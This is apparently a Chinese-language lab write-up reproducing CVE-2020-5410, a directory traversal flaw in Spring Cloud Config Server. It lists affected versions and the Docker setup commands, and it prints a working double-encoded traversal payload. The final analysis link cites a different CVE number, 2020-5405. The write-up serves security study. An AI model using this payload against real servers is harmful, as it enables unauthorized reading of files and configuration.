### Spring Cloud Config 目录穿越漏洞(CVE-2020-5410)复现

Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击

影响版本：

Spring Cloud Config: 2.2.0 to 2.2.2

Spring Cloud Config: 2.1.0 to 2.1.8

<br>

#### 环境搭建：

CentOS7（192.168.2.101）

拉取镜像

```bash
docker pull hyness/spring-cloud-config-server:2.1.6.RELEASE 
```

查看镜像：

```bash
docker images
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220104100613.png)

创建容器并运行

```bash
docker run -it --name=spring-cloud-config-server \
-p 8888:8888 \
hyness/spring-cloud-config-server:2.1.6.RELEASE \
--spring.cloud.config.server.git.uri=https://github.com/spring-cloud-samples/config-repo
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220104101312.png)

访问192.168.2.101:8888

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220104101226.png)

<br>

#### 漏洞利用

payload：

```
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..	%252Ftmp%23foo/development
```

<br>

#### 漏洞分析

参考：[CVE-2020-5405 Spring Cloud Config Server 目录穿越 - FreeBuf网络安全行业门户](https://www.freebuf.com/news/232744.html)